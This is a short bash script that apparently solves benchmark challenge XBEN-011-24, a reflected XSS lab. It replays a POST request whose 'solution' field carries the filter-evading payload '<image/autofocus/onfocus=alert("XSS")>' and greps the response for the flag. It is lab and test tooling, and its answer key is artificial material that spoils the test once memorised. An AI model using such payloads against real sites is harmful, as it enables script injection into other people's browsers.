#!/usr/bin/env bash
# XBEN-011-24 — reflected XSS. Proxy-mode twin of examples/xben/xben-011-xss-image-tag-allowed.sh. The
# target validates the submitted payload server-side and returns the flag when
# it would execute, so the attack is one replayed request carrying the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben-011-xss-image-tag-allowedp-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set method=POST --set path=/page \
  --set form.solution='<image/autofocus/onfocus=alert("XSS")>' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
